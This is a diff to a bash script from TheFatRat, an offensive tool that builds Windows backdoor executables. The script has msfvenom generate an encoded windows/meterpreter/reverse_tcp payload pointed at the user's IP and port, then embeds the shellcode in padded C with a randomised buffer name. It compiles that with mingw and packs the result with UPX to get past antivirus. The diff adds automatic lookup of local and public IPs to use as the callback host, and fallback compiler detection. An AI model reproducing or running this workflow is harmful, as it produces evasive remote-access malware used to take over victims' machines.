@@ -1,5 +1,65 @@
 #!/bin/bash
+file="config/config.path"
+if [ -f "$file" ]
+then
+msfconsole=`sed -n 14p $file`	
+msfvenom=`sed -n 15p $file`
+backdoor=`sed -n 16p $file`
+searchsploit=`sed -n 17p $file`
+else
+	echo "Configuration file does not exists , run setup.sh first ."
+exit 1
 
+
+fi
+path=`pwd`
+defcon=$path/config/conf.def
+if [ -f "$defcon" ]
+then
+yourip=`sed -n 1p $defcon`
+yourport=`sed -n 2p $defcon`
+fi
+
+#get user local ip , public ip & hostname into variables
+lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
+publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
+hostn=`host $publicip | awk '{print $5}' | sed 's/.$//'`
+
+# Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
+# You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
+# check mingw if exists
+      which i586-mingw32msvc-gcc > /dev/null 2>&1
+      if [ "$?" -eq "0" ]; then
+      echo [✔]::[mingw32]: installation found!;
+      COMPILER="i586-mingw32msvc-gcc"
+else
+      which i686-w64-mingw32-gcc > /dev/null 2>&1
+      if [ $? -eq 0 ]; then
+      echo [✔]::[mingw32]: installation found!;
+      COMPILER="i686-w64-mingw32-gcc"
+else
+   echo [x]::[warning]:this script require mingw32 installed to work ;
+   echo ""
+   echo [!]::Run setup.sh to install mingw32 ;
+   sleep 2s
+   exit 1
+ fi
+fi
+
+# check upx if exists
+      which upx > /dev/null 2>&1
+      if [ $? -eq 0 ]; then
+      echo [✔]::[Upx]: installation found!;
+
+else
+
+   echo [x]::[warning]:this script require upx to work ;
+   echo ""
+   echo [!]::Run setup.sh to install upx ;
+   echo ""
+   sleep 2s
+   exit 1
+fi
 
 ###################################################################################################
 # FatRat Coded By Screetsec ( Edo Maland )
@@ -27,7 +87,7 @@ white='\e[1;37m'
 red='\e[1;31m'
 yellow='\e[1;33m'
 BlueF='\e[1;34m'
-
+yellow='\e[1;33m'
 
 #Banner
 clear
@@ -47,10 +107,23 @@ echo -e $yellow" ===============================================================
 echo -e $okegreen""
 
 #input lhost and lport
-
-read -p ' Set LHOST IP: ' payloadLHOST; read -p ' Set LPORT: ' payloadLPORT                                                                        
-
-
+echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
+if [ -z "$yourip" ]; then
+read -p '  Set LHOST IP: ' yourip
+fi
+echo -e $okegreen ""
+if [ -z "$yourport" ]; then
+read -p '  Set LPORT: ' yourport
+fi                                                                       
 
 payload="windows/meterpreter/reverse_tcp"
 msfvenomBadChars="\x00\xff"
@@ -140,13 +213,9 @@ if [[ -f "$outputExe" ]]; then
 	echo ""
 fi
 
-# Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
-# You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
-if [[ ! -f /usr/bin/i586-mingw32msvc-gcc ]]; then
-	echo "The gcc-mingw32 package appears to not be installed because /usr/bin/i586-mingw32msvc-gcc is missing."
-	echo "Run 'apt-get install gcc-mingw32' to install it on Kali linux"
-	echo ""
-fi
+
+sleep 2
+
 
 # Until the Powerfull.exe is compiled successfully loop until it is
 while [[ ! -f "$outputExe" ]]; do
@@ -171,7 +240,7 @@ while [[ ! -f "$outputExe" ]]; do
     generatePadding
   
     echo "" >> $cProg
-    msfvenom -p ${payload} LHOST=$payloadLHOST LPORT=$payloadLPORT -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg
+    $msfvenom -p ${payload} LHOST=$yourip LPORT=$yourport -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg
 
     generatePadding
 
@@ -189,11 +258,9 @@ while [[ ! -f "$outputExe" ]]; do
     cat $cProg | sed "s/buf/${randomBufName}/g" > $cProgTemp
     mv -f $cProgTemp $cProg
     # To install the following program on Kali Linux - "apt-get install gcc-mingw32"
-    i586-mingw32msvc-gcc -o $outputExe $cProg
+    $COMPILER -o $outputExe $cProg
 
 done
 
 # Use UPX to create a second executable, testing...
 upx -q --ultra-brute -o $outputUPX $outputExe
-
-
